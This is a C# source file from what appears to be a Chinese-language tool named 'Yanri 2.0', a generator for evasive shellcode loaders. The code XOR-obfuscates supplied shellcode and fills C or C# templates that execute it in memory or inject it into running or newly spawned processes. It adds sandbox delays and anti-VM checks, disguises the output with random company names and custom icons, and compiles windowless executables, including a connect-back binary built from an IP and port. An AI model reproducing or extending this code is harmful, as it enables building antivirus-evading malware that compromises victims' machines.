using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Text.RegularExpressions;

namespace 掩日2._0
{
    class Core
    {
        //极简模式
        public static bool Generate_1_IP(string arch, string ip, string port, string path)
        {
            string finalip = "";

            foreach (char c in ip)
            {
                finalip += "'" + c + "',";
            }
            finalip += @"'\0'";

            string FinalCode = T_EasyMode.GetCode().Replace("{{ip}}", finalip).Replace("{{port}}", port);

            string temp_path = @"C:\Windows\Temp\YANRI_TEMP_" + Common.GetRandomString(6, true, true, true, false, "") + ".c";
            System.IO.File.WriteAllText(temp_path, FinalCode);

            //开始编译
            string compilecmd = @"gcc " + temp_path + @" -o """ + path + @""" -mwindows -m"+ arch.Substring(0, 2) +" -lws2_32";

            if (!Common.Execute_Cmd(compilecmd).Contains("error:"))
            {
                System.IO.File.Delete(temp_path);
                return true;
            }
            else
            {
                System.IO.File.Delete(temp_path);
                return false;
            }
        }

        //处理 shellcode，并全部转换成 c# 格式
        public static string Shellcode_Handle(string raw)
        {
            string result = "";
            //去掉所有换行 → 匹配出shellcode → 去掉所有空格 → 去掉引号、分号、括号 → 转换格式
            raw = raw.Replace("\r\n", "").Replace("\r", "").Replace("\n", "");

            if (raw.Contains(@"\x"))
            {
                //c 类型的shellcode
                string pattern = @"=.*$";
                string temp = Regex.Match(raw, pattern).Value;
                result = temp.Replace(@"""", "").Replace(" ", "").Replace("=", "").Replace(";", "");
            }
            else if ((raw.Contains(@",0x")) || (raw.Contains(@", 0x")))
            {
                //c# 类型的shellcode
                string pattern = @"{.*}";
                string temp = Regex.Match(raw, pattern).Value;
                result = temp.Replace("{", "").Replace(" ", "").Replace("}", "").Replace(";", "");
            }
            else 
            {
                return "";
            }
            //转换成 c# 格式
            if (result.Contains(@"\x"))
            {
                result = result.Replace(@"\x", ",0x").TrimStart(',');
            }
            return result;
        }

        //变异异或，需要指定返回 c 还是 c# 格式的 shellcode
        public static string XOR_C(string format, string raw)
        {
            string result = "";
            string[] shellcode_array = raw.Split(',');
            string[] temp = new string[shellcode_array.Length];
            int j = 234;
            int add = 12;
            for (int i = 0; i < shellcode_array.Length; i++)
            {
                temp[i] = string.Format("{0:x2}", string_to_int(shellcode_array[i]) ^ 123 ^ j);
                temp[i] = "0x" + temp[i].Substring(temp[i].Length - 2, 2);
                j += add;
            }
            result = string.Join(",", temp);
            //转换一下格式
            if (format == "c")
            {
                result = result.Replace("0x", @"\x").Replace(",", "");
            }
            return result;
        }

        //字符串转十进制，返回byte形式
        public static byte string_to_int(string str)
        {
            string temp = str.Substring(str.Length - 2, 2);
            int hex = int.Parse(temp, System.Globalization.NumberStyles.HexNumber);
            return BitConverter.GetBytes(hex)[0];
        }

        //生成 c 源码并编译
        public static bool Gen_C(string shellcode, string path, string execute, string inject, string arch, string detect)
        {
            string finalcode;
            shellcode = Shellcode_Handle(shellcode);
            shellcode = XOR_C("c", shellcode);

            Random r = new Random();
            int n = r.Next(0, Global.Company_name.Length - 1);
            string comname = Global.Company_name[n];

            string c_compile_info = C_Template.compile_info.Replace("{{companyname}}", comname);

            //图标设置
            if (Global.ICONPATH != "")
            {
                c_compile_info += @"IDI_ICON1 ICON ""{{path}}""";
                c_compile_info = c_compile_info.Replace("{{path}}", Global.ICONPATH.Replace("\\", "\\\\"));
            }
            System.IO.File.WriteAllText("C:\\Windows\\Temp\\Yanri_res.rc", c_compile_info);
            string res_cmd = "windres C:\\Windows\\Temp\\Yanri_res.rc C:\\Windows\\Temp\\Yanri_res.o";
            if (arch.StartsWith("32"))
            {
                res_cmd += " --target=pe-i386";
            }
            Common.Execute_Cmd(res_cmd);
            bool icon_set = System.IO.File.Exists("C:\\Windows\\Temp\\Yanri_res.o");
            //System.IO.File.Delete("C:\\Windows\\Temp\\Yanri_res.rc");

            //根据执行方式选择代码模板
            if (execute == "执行4-Dynamic")
            {
                finalcode = C_Template.Dynamic.Replace("{{shellcode}}", shellcode);
            }
            else
            {
                finalcode = C_Template.Base_Code.Replace("{{shellcode}}", shellcode);
                switch (execute)
                {
                    case "执行1-VirtualAlloc":
                        finalcode = finalcode.Replace("//{{execute}}", C_Template.VirtualALloc);
                        break;
                    case "执行2-GetProcAddress":
                        finalcode = finalcode.Replace("//{{execute}}", C_Template.GetProcessAddress);
                        break;
                    case "注入现有进程":
                        finalcode = finalcode.Replace("//{{execute}}", C_Template.CreateRemoteThread);
                        finalcode = finalcode.Replace("{{pid}}", inject);
                        break;
                    case "注入新进程":
                        finalcode = finalcode.Replace("//{{execute}}", C_Template.CreateNew);
                        finalcode = finalcode.Replace("{{processname}}", inject);
                        break;
                    default:
                        return false;
                }
            }
            //虚拟机及沙箱检测
            switch (detect)
            {
                case "沙箱：延时约180秒":
                    finalcode = finalcode.Replace("//{{sanbox_vm_detect}}", C_Template.Super_Delay);
                    break;
                case "虚拟机：简单反虚拟机":
                    finalcode = finalcode.Replace("//{{sanbox_vm_detect}}", C_Template.Vm_Detect);
                    break;
            }

            //保存代码到临时文件
            string temp_path = @"C:\Windows\Temp\YANRI_TEMP_" + Common.GetRandomString(6, true, true, true, false, "") + ".c";
            System.IO.File.WriteAllText(temp_path, finalcode);

            //编译
            if (C_Compiler(arch, temp_path, path, icon_set))
            {
                //System.IO.File.Delete(temp_path);
                System.IO.File.Delete("C:\\Windows\\Temp\\Yanri_res.o");
                return true;
            } else
            {
                System.IO.File.Delete(temp_path);
                System.IO.File.Delete("C:\\Windows\\Temp\\Yanri_res.o");
                return false;
            }
        }

        //生成 c# 源码并编译
        public static bool Gen_CS(string shellcode, string path, string execute, string inject, string arch, string detect)
        {
            shellcode = Shellcode_Handle(shellcode);
            shellcode = XOR_C("c#", shellcode);
            string target_arch = "/platform:x86 /optimize /target:winexe ";
            if (arch.StartsWith("6"))
            {
                target_arch = target_arch.Replace("86", "64");
            }
            if (Global.ICONPATH != "")
            {
                target_arch += " /win32icon:" + Global.ICONPATH;
            }
            string finalcode = "";
            
            //根据执行方式决定代码模板
            switch (execute)
            {
                case "执行1-GetProcAddress":
                    finalcode = CS_Template.getprocaddress.Replace("{{shellcode}}", shellcode);
                    break;
                case "执行2-VirtualProtect":
                    finalcode = CS_Template.virtualprotect.Replace("{{shellcode}}", shellcode);
                    break;
                case "注入现有进程":
                    finalcode = CS_Template.syscall_exist.Replace("{{shellcode}}", shellcode).Replace("{{pid}}", inject);
                    target_arch += " /unsafe";
                    break;
                case "注入新进程":
                    finalcode = CS_Template.syscall_new.Replace("{{shellcode}}", shellcode).Replace("{{processname}}", inject);
                    target_arch += " /unsafe";
                    break;
            }

            //虚拟机/沙箱检测
            switch (detect)
            {
                case "沙箱：延时约180秒":
                    finalcode.Replace("//{{sanbox_vm_detect}}", CS_Template.super_delay);
                    break;
                case "虚拟机：简单反虚拟机":
                    finalcode.Replace("//{{sanbox_vm_detect}}", CS_Template.vm_detect);
                    break;
            }

            //代码生成完毕，准备开始编译
            Compiler compiler = new Compiler();
            compiler.compileToExe(finalcode, path, target_arch);
            //System.IO.File.WriteAllText(@"C:\Users\www1y\Desktop\arch.txt", target_arch);


            return true;
        }

        //编译 c
        public static bool C_Compiler(string arch, string source_path, string save_path, bool res=false)
        {
            string arch_cmd = " -m" + arch.Substring(0, 2);
            string compile_cmd = @"gcc -mwindows -o """ + save_path + @"""" + arch_cmd + @" """ + source_path + @"""";
            if (res)
            {
                compile_cmd += @" C:\\Windows\\Temp\\Yanri_res.o";
            }
            //System.IO.File.WriteAllText(@"C:\\Users\\www1y\\Desktop\\cmd1.txt", compile_cmd);
            if (!Common.Execute_Cmd(compile_cmd).Contains("rror:"))
            {
                return true;
            }
            return false;
        }
    }
}
